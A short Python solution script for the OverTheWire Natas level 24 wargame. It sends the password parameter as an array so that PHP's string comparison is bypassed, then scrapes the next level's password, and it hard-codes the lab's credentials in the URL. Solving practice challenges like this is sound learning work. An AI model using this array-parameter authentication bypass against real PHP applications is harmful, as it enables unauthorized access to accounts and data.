import requests
import re

URL = 'http://natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg@natas24.natas.labs.overthewire.org/'        

def php_code():
    # LOL pretty much the same, this was too easy haha
    r = requests.get(f"{URL}?passwd[]=11iloveyou")
    return re.findall(r"Password: [^<]*", r.text)[0].split(': ')[1]

if __name__ == '__main__':
    if requests.head(URL).status_code == requests.codes.ok:
        print(f'Password = {php_code()}')
    else:
        print('Authentication Failed!')
